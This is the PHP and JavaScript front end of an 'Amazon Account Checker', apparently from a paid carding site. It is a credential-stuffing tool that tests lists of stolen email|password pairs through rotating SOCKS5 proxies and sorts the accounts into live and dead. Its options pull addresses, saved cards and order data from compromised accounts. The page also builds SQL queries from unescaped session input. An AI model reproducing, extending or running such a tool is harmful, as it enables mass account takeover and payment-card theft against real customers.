<?php
session_start();

if (empty($_SESSION['email'])){
header('location: /account'); 
}

$link = "http://amex-team.ml/";
include('../../account/login/auth.php');
                  
                    $email = $_SESSION['email'];
                    $query = "SELECT * FROM user WHERE email='$email'";
                    $exe = mysql_query($query);
                    $no = 1;
                    while($row = mysql_fetch_assoc($exe)){
                        $invite = $row['regby']; 
                        $credits = $row['credits'];    
                        $banned = $row['banned'];                    
                        $admin = $row['admin']; 
                        $orders = $row['orders']; 
                    }
$cekuser = mysql_query("SELECT * FROM user WHERE email = '".$_SESSION["email"]."'");
$jumlah = mysql_num_rows($cekuser);
if($jumlah == 0) {
session_destroy();
header('location: /account/');
}
if ($banned == 1) {
session_destroy();
header('location: /account/banned');
}



?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta name="description" content="AMAZON ACCOUNT CHECKER" />
	<meta name="author" content="AMAZON ACCOUNT CHECKER" />
	<title>AMAZON ACCOUNT CHECKER</title>
	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.9.1/jquery-ui.min.js"></script>
	<style>
			body
		{
			background-color: rgb(74,81,85);
			font-size: 9pt;
			font-family:Verdana;
			line-height:12pt;
			color: #cccccc;
		}
			body,td,th {
			color: #99CC00;
		}
		h2
		{
				color: #FFCC00;
		}
		h1 {
				padding: 10px 15px;
				color: red;
		}

		.main-content {
				width: 85%; height: 360px;margin: auto; background: rgb(74,81,85);      border-radius: 5px 5px 5px 5px; box-shadow: 0 0 3px rgba(0, 0, 0, 0.5); min-height: 360px;      position: relative;
		}
		textarea, input {
				border-radius: 5px 5px 5px 5px;
		}
		input {
				height: 14px;width: 30px;text-align: center;
		}
			
			
		.button {
			   
		}
		.submit-button
				{
						background: #57A02C;
						border:solid 1px #57A02C;
						border-radius:5px;
								-moz-border-radius: 5px;
								-webkit-border-radius: 5px;
						-moz-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
						-webkit-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
						text-shadow: 0 -1px 1px rgba(0,0,0,0.25);
						border-bottom: 1px solid rgba(0,0,0,0.25);
						position: relative;
						color:#FFF;
						display: inline-block;
						cursor:pointer;
						font-size:13px;
						padding:3px 8px;
						height: 30px;width: 120px;
				}
        .submit-button:hover {
        background:#82D051;border:solid 1px #86CC50;
        height: 30px;width: 120px;      }
 
		#show {
				width: 70%;margin: auto;padding: 10px 10px;
		}

		.business{
			font-weight:bold;
			color:yellow;
		}
		.premier{
			font-weight:bold;
			color:#00FF00;
		}
		.verified{
			font-weight:bold;
			color:#006DB0;
		}
		.fieldset{
			border: 1px dashed #cccccc;
			margin-top: 20px;
		}
		.tvmit_live{
			border: 1px dashed #cccccc;
			color:yellow;
			font-weight:bold;
		}
		.tvmit_die{
			border: 1px dashed #cccccc;
			color:red;
			font-weight:bold;
		}
		#result{
			display:none;
		}
	</style>
	
<script type="text/javascript">

		var ajaxCall;

		Array.prototype.remove = function(value){
			var index = this.indexOf(value);
			if(index != -1){
				this.splice(index, 1);
			}
			return this;
		};
		function enableTextArea(bool){
			$('#socks').attr('disabled', bool);
			$('#mailpass').attr('disabled', bool);
		}
		function tvmit_liveUp(){
			var count = parseInt($('#tvmit_live_count').html());
			count++;
			$('#tvmit_live_count').html(count+'');
		}
		function tvmit_dieUp(){
			var count = parseInt($('#tvmit_die_count').html());
			count++;
			$('#tvmit_die_count').html(count+'');
		}

		function stopLoading(bool){
			$('#loading').attr('src', 'clear.gif');
			var str = $('#checkStatus').html();
			$('#checkStatus').html(str.replace('Checking','Stopped'));
			enableTextArea(false);
			$('#submit').attr('disabled', false);
			$('#stop').attr('disabled', true);
			if(bool){
				alert('Done');
			}else{
				ajaxCall.abort();
			}
			updateTitle('AMAZON Account Checker');
		}
		function updateTitle(str){
			document.title = str;
		}
		function updateTextBox(mp, sock){
			var mailpass = $('#mailpass').val().split("\n");
			var socks = $('#socks').val().split("\n");
			mailpass.remove(mp);
			socks.remove(sock);
			$('#socks').val(socks.join("\n"));
			$('#mailpass').val(mailpass.join("\n"));
		}
		function ManhTV(lstMP, lstSock, curMP, curSock, delim, cEmail, maxFail, failed){
			
			if(lstMP.length<1 || lstSock.length<1 || curMP>=lstMP.length || curSock>=lstSock.length){
				stopLoading(true);
				return false;
			}
			if(failed>=maxFail){
				curSock++;
				ManhTV(lstMP, lstSock, curMP, curSock, delim, cEmail, maxFail, 0);
				return false;
			}
			updateTextBox(lstMP[curMP], lstSock[curSock]);
			
			ajaxCall = $.ajax({
				url: 'manhtv.php',
				dataType: 'json',
				cache: false,
				type: 'POST',
				beforeSend: function (e) {
					updateTitle(lstMP[curMP] + ' - Starbucks Account Checker');
					$('#checkStatus').html('Checking: ' + lstSock[curSock] + '|'+ lstMP[curMP]).effect("highlight", {color:'#00ff00'}, 1000);
					$('#loading').attr('src', 'loading.gif');
				},
				data: 'ajax=1&do=check&sock='+encodeURIComponent(lstSock[curSock])+'&mailpass='+encodeURIComponent(lstMP[curMP])
						+'&delim='+encodeURIComponent(delim)+'&email='+cEmail,
				success: function(data) {
					switch(data.error){
						case -1:
							curMP++;
							curSock++;
							$('#wrong').append(data.msg+'<br />').effect("highlight", {color:'#ff0000'}, 1000);
							break;
						case 1:
						case 3:
							curSock++;
							$('#badsock').append(data.msg+'<br />').effect("highlight", {color:'#ff0000'}, 1000);
							break;
						case 2:
							curMP++;
							$('#tvmit_die').append(data.msg+'<br />').effect("highlight", {color:'#ff0000'}, 1000);
							failed++;
							tvmit_dieUp();
							break;
						case 0:
							curMP++;
							curSock++;
							$('#tvmit_live').append(data.msg+'<br />').effect("highlight", {color:'#00ff00'}, 1000);
							tvmit_liveUp();
							break;
					}
					ManhTV(lstMP, lstSock, curMP, curSock, delim, cEmail, maxFail, failed);
				}
			});
			return true;
		}
		function filterMP(mp, delim){
			var mps = mp.split("\n");
			var filtered = new Array();
			var lstMP = new Array();
			for(var i=0;i<mps.length;i++){
				if(mps[i].indexOf('@')!=-1){
					var infoMP = mps[i].split(delim);
					for(var k=0;k<infoMP.length;k++){
						if(infoMP[k].indexOf('@')!=-1){
							var email = $.trim(infoMP[k]);
							var pwd = $.trim(infoMP[k+1]);
							if(filtered.indexOf(email.toLowerCase())==-1){
								filtered.push(email.toLowerCase());
								lstMP.push(email+'|'+pwd);
								break;
							}
						}
					}
				}
			}
			return lstMP;
		}
		$(document).ready(function(){
			$('#stop').attr('disabled', true).click(function(){
			  stopLoading(false);  
			});
			$('#submit').click(function(){
				var delim = $('#delim').val().trim();
				var mailpass = filterMP($('#mailpass').val(), delim);
				var regex = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/g;
				var found = $('#socks').val().match(regex);
				var bank = $('#bank').is(':checked') ? 1 : 0;
				var card = $('#card').is(':checked') ? 1 : 0;
				var infor = $('#info').is(':checked') ? 1 : 0;
				var cEmail = $('#email').is(':checked') ? 1 : 0;
				var maxFail = parseInt($('#fail').val());
				var failed = 0;
				if(found == null){
					alert('No Sock5 found!');
					return false;
				}
				if($('#mailpass').val().trim()==''){
					alert('No Mail/Pass found!');
					return false;
				}
				$('#socks').val(found.join("\n")).attr('disabled', true);
				$('#mailpass').val(mailpass.join("\n")).attr('disabled', true);
				$('#result').show();
				$('#submit').attr('disabled', true);
				$('#stop').attr('disabled', false);
				ManhTV(mailpass, found, 0, 0, delim, cEmail, maxFail, 0);
				return false; 
			});
		});
</script>
</head>
<body>
<?php

$emailArea = <<< email
admin@anuan.com|12345678
email;
$sockArea = <<< sock
127.0.0.1:1080
sock;
?>
<br /><br />
<div class="main-content">
 <section id="main" class=""><center><h1>AMAZON ACCOUNT CHECKER</h1>
 

<form method="post">
	<div align="center">
		<textarea name="mailpass" id="mailpass" cols="60" rows="10"><?php

echo $emailArea;

?></textarea>
		<textarea name="socks" id="socks" cols="30" rows="10"><?php

echo $sockArea;

?></textarea><br />
		<b>Delimiter:</b> <input type="text" name="delim" id="delim" value="|" size="1" />
		&nbsp;<input type="checkbox" name="email" id="email"  value="1" /><b>Check Email</b>
        | Change socks if fail: <input type="text" name="fail" id="fail" value="5" size="1" /> time(s)<br />
		<input type="checkbox" name="address" id="address" checked="checked" value="1" /><b>GET ADDRESS</b>
		<input type="checkbox" name="card" id="card" checked="checked" value="1" /><b>GET CARD</b>
		<input type="checkbox" name="order" id="order" checked="checked" value="1" /><b>GET ORDER</b><br />
		<input type="button" class = "submit-button" value=" CHECK NOW " id="submit" />&nbsp;<input type="button" class = "submit-button" value=" STOP " id="stop" /><br /><br />
        <img id="loading" src="clear.gif" /><br />
        <span id="checkStatus"></span>
	</div>
</form>
  </center></section>
</div>
<div id="result">
    <fieldset class="fieldset">
        <legend class="tvmit_live">LIVE: <span id="tvmit_live_count">0</span></legend>
        <div id="tvmit_live"></div>
    </fieldset>
    <fieldset class="fieldset">
        <legend class="tvmit_die">DIE: <span id="tvmit_die_count">0</span></legend>
        <div id="tvmit_die"></div>
    </fieldset>
    <fieldset class="fieldset">
        <legend class="tvmit_live">Live (No Card):</legend>
        <div id="wrong"></div>
    </fieldset>
    <fieldset class="fieldset">
        <legend class="tvmit_die">Bad Socks:</legend>
        <div id="badsock"></div>
    </fieldset>
</div>
</body>
</html>